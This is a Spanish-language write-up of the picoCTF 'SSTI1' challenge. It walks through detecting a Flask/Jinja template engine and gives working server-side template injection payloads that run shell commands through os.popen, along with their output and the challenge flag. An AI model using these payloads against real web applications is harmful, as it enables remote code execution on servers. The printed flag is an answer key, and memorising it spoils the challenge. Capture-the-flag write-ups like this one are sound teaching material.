# Reto: SSTI1

## Descripción

I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website here!

## Solución

El nombre `SSTI` es la abreviación de una vulnerabilidad que tiene que ver con aprovecharnos de los motores de renderización de plantillas (templates).

Lo primero que debemos intentar hacer es encontrar qué motor se está usando. Esto lo podemos verificar usando su sintaxis específica.

Después de tiempo y de probar varias opciones, encontramos que la sintaxis utilizada es la de `{{}}`.

Al pasar `{{self}}`, se nos regresa `<TemplateReference None>`. Por el None en mayúsculas, esto muy seguramente sea python. Esta es una aplicación de flask puesto que `{{g}}` regresa esta información.

Conociendo esto, podemos crear un payload como el siguiente:
```python
{{request.application.__globals__['__builtins__']['__import__']('os').popen("ls").read()}}
# __pycache__ app.py flag requirements.txt
{{request.application.__globals__['__builtins__']['__import__']('os').popen("cat flag").read()}}
# picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bcf73b04}
```

`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bcf73b04}`

## Notas

Se puede hacer, en python, algo como esto:
```python
var.__class__.__init__.__globals__['__builtins__']
```
Para acceder a las funciones nativas de python. Sólo funciona en ciertas ocasiones.

La función `os.popen()` permite mandar comandos y así.
